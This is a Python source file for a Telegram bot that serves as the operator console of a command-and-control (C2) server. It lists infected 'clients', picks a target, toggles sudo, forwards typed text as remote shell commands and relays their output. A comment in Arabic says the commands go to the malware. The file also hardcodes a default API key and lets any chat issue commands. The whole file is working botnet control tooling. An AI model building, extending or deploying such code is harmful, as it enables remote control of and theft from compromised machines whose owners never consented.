"""
C2 Telegram Bot — Control & Data Collection
============================================
Commands:
  /start            — Welcome message
  /clients          — List connected clients
  /select <id>      — Select a client as target
  /status           — Show selected client + sudo mode
  /sudo             — Toggle sudo mode
  /history          — Last 5 commands
  /clear            — Clear selected client
  /help             — Show all commands

  Any text (no /) → sent as command to selected client
"""

import sys, os, json, asyncio
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import requests
from telegram import Update
from telegram.ext import (
    ApplicationBuilder, CommandHandler,
    MessageHandler, filters, ContextTypes,
)
from modules.crypto_utils import encrypt_data
import base64

# ── Config ────────────────────────────────────────────────────────────
BASE_DIR            = os.path.dirname(os.path.abspath(__file__))
TELEGRAM_CONFIG     = os.path.join(BASE_DIR, "telegram_config.json")
C2_URL              = os.environ.get("C2_SERVER_URL", "http://localhost:5000")
C2_KEY              = os.environ.get("C2_API_KEY",    "c2_super_secret_key_2026_123456")
C2_HEADERS          = {"X-API-Key": C2_KEY, "Content-Type": "application/json"}

# Per-chat session: { chat_id: {"client": str|None, "sudo": bool} }
_sessions: dict[int, dict] = {}


# ── Load token from telegram_config.json ─────────────────────────────
def _load_token() -> str:
    try:
        if os.path.exists(TELEGRAM_CONFIG):
            with open(TELEGRAM_CONFIG, "r", encoding="utf-8") as f:
                cfg = json.load(f)
            token = cfg.get("token", "").strip()
            if token:
                print(f"✅ Token loaded from {TELEGRAM_CONFIG}")
                return token
    except Exception as e:
        print(f"⚠️  Could not load telegram_config.json: {e}")
    # Fallback to env or hardcoded default
    return os.environ.get("TELEGRAM_BOT_TOKEN", "")


# ── Auth check (token = security layer — no extra restriction) ────────
def _allowed(chat_id: int) -> bool:
    return True


def _session(chat_id: int) -> dict:
    if chat_id not in _sessions:
        _sessions[chat_id] = {"client": None, "sudo": False}
    return _sessions[chat_id]


# ── C2 API helpers ────────────────────────────────────────────────────
def _get_clients() -> dict:
    try:
        r = requests.get(f"{C2_URL}/clients", headers=C2_HEADERS, timeout=5)
        return r.json()
    except Exception as e:
        return {"error": str(e)}


def _send_command(client_id: str, command: str, sudo: bool = False) -> dict:
    try:
        r = requests.post(
            f"{C2_URL}/command",
            json={"command": command, "client_id": client_id, "sudo": sudo},
            headers=C2_HEADERS,
            timeout=15,
        )
        return r.json()
    except Exception as e:
        return {"error": str(e)}


def _poll_command_result(cmd_id: int, timeout: int = 90, interval: float = 2.0) -> dict | None:
    """يسأل c2_server كل `interval` ثانية لحد ما الأمر يخلص أو timeout"""
    import time
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = requests.get(
                f"{C2_URL}/command/{cmd_id}",
                headers=C2_HEADERS,
                timeout=5,
            )
            if r.status_code == 200:
                data = r.json()
                if data.get("status") in ("done", "error"):
                    return data
        except Exception:
            pass
        time.sleep(interval)
    return None


def _get_history(limit: int = 5) -> list:
    try:
        r = requests.get(f"{C2_URL}/commands/history", headers=C2_HEADERS, timeout=5)
        return r.json()[:limit]
    except Exception:
        return []


# ── Handlers ──────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not _allowed(chat_id):
        await update.message.reply_text("⛔ Unauthorized")
        return
    await update.message.reply_text(
        "🖥️ *C2 Control Bot*\n\n"
        "Available commands:\n"
        "`/clients`       — list connected clients\n"
        "`/select <id>`   — set target client\n"
        "`/status`        — show current target\n"
        "`/sudo`          — toggle sudo mode\n"
        "`/history`       — last 5 commands\n"
        "`/clear`         — clear selected client\n"
        "`/help`          — this message\n\n"
        "Just type a command to send it to the selected client.",
        parse_mode="Markdown",
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await cmd_start(update, context)


async def cmd_clients(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not _allowed(chat_id):
        return

    clients = _get_clients()
    if "error" in clients:
        await update.message.reply_text(f"❌ C2 server error: {clients['error']}")
        return
    if not clients:
        await update.message.reply_text("⚠️ No clients connected.")
        return

    lines = ["📡 *Connected Clients:*\n"]
    for cid, info in clients.items():
        is_server = info.get("is_server", False)
        icon = "🖥️" if is_server else "💻"
        status = "🟢 Running" if is_server else (
            "🟢 Online" if info.get("timestamp", 0) > (__import__("time").time() - 300) else "🔴 Offline"
        )
        lines.append(f"{icon} `{cid}`  {status}")

    lines.append("\nUse `/select <id>` to target a client.")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def cmd_select(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not _allowed(chat_id):
        return

    if not context.args:
        await update.message.reply_text("Usage: `/select <client_id>`", parse_mode="Markdown")
        return

    client_id = " ".join(context.args)
    clients   = _get_clients()

    if "error" in clients:
        await update.message.reply_text(f"❌ Cannot reach C2: {clients['error']}")
        return

    if client_id not in clients:
        names = "\n".join(f"• `{k}`" for k in clients)
        await update.message.reply_text(
            f"❌ Client `{client_id}` not found.\n\nAvailable:\n{names}",
            parse_mode="Markdown",
        )
        return

    _session(chat_id)["client"] = client_id
    await update.message.reply_text(
        f"✅ Target set to `{client_id}`\nNow just type your command.",
        parse_mode="Markdown",
    )


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not _allowed(chat_id):
        return
    sess   = _session(chat_id)
    client = sess["client"] or "_(none)_"
    sudo   = "🔴 ON" if sess["sudo"] else "⚪ OFF"
    await update.message.reply_text(
        f"📌 *Current Status*\n\nTarget: `{client}`\nSudo: {sudo}",
        parse_mode="Markdown",
    )


async def cmd_sudo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not _allowed(chat_id):
        return
    sess         = _session(chat_id)
    sess["sudo"] = not sess["sudo"]
    state        = "🔴 *ENABLED*" if sess["sudo"] else "⚪ *DISABLED*"
    await update.message.reply_text(
        f"🛡️ Sudo mode: {state}",
        parse_mode="Markdown",
    )


async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    _session(chat_id)["client"] = None
    await update.message.reply_text("🗑️ Target cleared.")


async def cmd_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not _allowed(chat_id):
        return
    history = _get_history(5)
    if not history:
        await update.message.reply_text("📭 No commands in history.")
        return
    lines = ["📜 *Last 5 Commands:*\n"]
    for item in history:
        status_icon = {"done": "✅", "error": "❌", "pending": "⏳"}.get(item.get("status", ""), "❓")
        lines.append(
            f"{status_icon} `{item.get('command', '?')}`  →  `{item.get('client_id', '?')}`"
        )
        if item.get("result"):
            # Show first line of result only
            first_line = item["result"].split("\n")[0][:80]
            lines.append(f"    └ `{first_line}`")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Any plain text → forward as command to selected client."""
    chat_id = update.effective_chat.id
    if not _allowed(chat_id):
        await update.message.reply_text("⛔ Unauthorized")
        return

    text = (update.message.text or "").strip()
    if not text:
        return

    sess      = _session(chat_id)
    client_id = sess["client"]
    use_sudo  = sess["sudo"]

    # If no client selected, log it as data (old behavior) + suggest
    if not client_id:
        # Save to C2 as telegram log
        try:
            encrypted = encrypt_data(text)
            encoded   = base64.b64encode(encrypted).decode()
            requests.post(
                f"{C2_URL}/data",
                json={"client_id": "telegram", "type": "text",
                      "encrypted_data": encoded, "chat_id": chat_id},
                timeout=5,
            )
        except Exception:
            pass
        await update.message.reply_text(
            "⚠️ No client selected.\n"
            "Use `/clients` to list clients, then `/select <id>`.",
            parse_mode="Markdown",
        )
        return

    # Send command to C2
    await update.message.reply_text(
        f"⏳ Sending `{text}` to `{client_id}`{'  🛡️ sudo' if use_sudo else ''}…",
        parse_mode="Markdown",
    )

    result = _send_command(client_id, text, sudo=use_sudo)

    if "error" in result:
        await update.message.reply_text(f"❌ Error: {result['error']}")
        return

    status     = result.get("status", "queued")
    cmd_result = result.get("result")
    cmd_id     = result.get("command_id")

    if status == "done" and cmd_result is not None:
        # نتيجة فورية (C2-Server نفّذ الأمر محلياً)
        output = cmd_result or "(no output)"
        if len(output) > 3800:
            output = output[:3800] + "\n… (truncated)"
        await update.message.reply_text(
            f"✅ *Done* (id={cmd_id})\n```\n{output}\n```",
            parse_mode="Markdown",
        )

    elif status == "error" and cmd_result is not None:
        await update.message.reply_text(
            f"❌ *Error* (id={cmd_id})\n```\n{cmd_result}\n```",
            parse_mode="Markdown",
        )

    elif status in ("sent_via_telegram", "queued") and cmd_id:
        # الأمر اتبعت للمالوير — نستنى النتيجة (90 ثانية max)
        await update.message.reply_text(
            f"📡 *Sent* (id={cmd_id})\n"
            f"Waiting for `{client_id}` to respond…",
            parse_mode="Markdown",
        )
        res = await asyncio.get_event_loop().run_in_executor(
            None, _poll_command_result, cmd_id, 90
        )
        if res is None:
            await update.message.reply_text(
                f"⏱️ *Timeout* (id={cmd_id})\n"
                f"No response from `{client_id}` within 90 s. Result will appear in the dashboard when it arrives.",
                parse_mode="Markdown",
            )
        else:
            output = res.get("result") or "(no output)"
            if len(output) > 3800:
                output = output[:3800] + "\n… (truncated)"
            icon = "✅" if res.get("status") == "done" else "❌"
            await update.message.reply_text(
                f"{icon} *Result* (id={cmd_id})\n```\n{output}\n```",
                parse_mode="Markdown",
            )

    else:
        await update.message.reply_text(
            f"📨 *Queued* (id={cmd_id})\n"
            f"Command sent to `{client_id}`. Result will appear in dashboard.",
            parse_mode="Markdown",
        )


async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not _allowed(chat_id):
        return
    try:
        photo     = update.message.photo[-1]
        file      = await photo.get_file()
        file_path = f"photo_{update.message.message_id}.jpg"
        await file.download_to_drive(file_path)
        await update.message.reply_text("🖼️ Photo received and saved.")
    except Exception as e:
        await update.message.reply_text(f"❌ Photo error: {e}")


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not _allowed(chat_id):
        return
    try:
        doc       = update.message.document
        file      = await doc.get_file()
        file_path = doc.file_name
        await file.download_to_drive(file_path)
        await update.message.reply_text(f"📁 File `{doc.file_name}` received.", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ File error: {e}")


async def error_handler(update, context):
    print(f"GLOBAL ERROR: {context.error}")


# ── Main ──────────────────────────────────────────────────────────────
if __name__ == "__main__":
    TOKEN = _load_token()
    if not TOKEN:
        print("❌ No bot token found!")
        print("   Add the token via the Dashboard → Telegram page, then restart bot.py")
        sys.exit(1)

    app = (
        ApplicationBuilder()
        .token(TOKEN)
        .connect_timeout(30)
        .read_timeout(30)
        .build()
    )

    app.add_handler(CommandHandler("start",   cmd_start))
    app.add_handler(CommandHandler("help",    cmd_help))
    app.add_handler(CommandHandler("clients", cmd_clients))
    app.add_handler(CommandHandler("select",  cmd_select))
    app.add_handler(CommandHandler("status",  cmd_status))
    app.add_handler(CommandHandler("sudo",    cmd_sudo))
    app.add_handler(CommandHandler("clear",   cmd_clear))
    app.add_handler(CommandHandler("history", cmd_history))
    app.add_handler(MessageHandler(filters.PHOTO,        handle_photo))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(error_handler)

    print("🤖 C2 Bot is running...")
    print(f"   C2 Server: {C2_URL}")
    app.run_polling()
